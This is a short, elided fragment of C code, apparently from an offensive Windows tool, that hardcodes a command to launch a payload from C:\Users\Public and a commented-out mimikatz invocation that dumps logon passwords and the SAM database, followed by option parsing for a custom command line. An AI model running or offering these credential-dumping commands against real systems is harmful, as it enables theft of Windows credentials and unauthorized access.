...
//char text[] = "C:\\Users\\Public\\mimikatz.exe coffee log token::elevate privilege::debug sekurlsa::logonpasswords lsadump::sam exit";
char text[] = "cmd /c C:\\Users\\Public\\bin1.exe";
wchar_t wtext[2000];
	...
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		...
		case 'c':
			...
			if (argc > 1 && argv[1][0] != '-')
			{
				...
				g_pwszCommandLine = wtext;
				wprintf(g_pwszCommandLine);
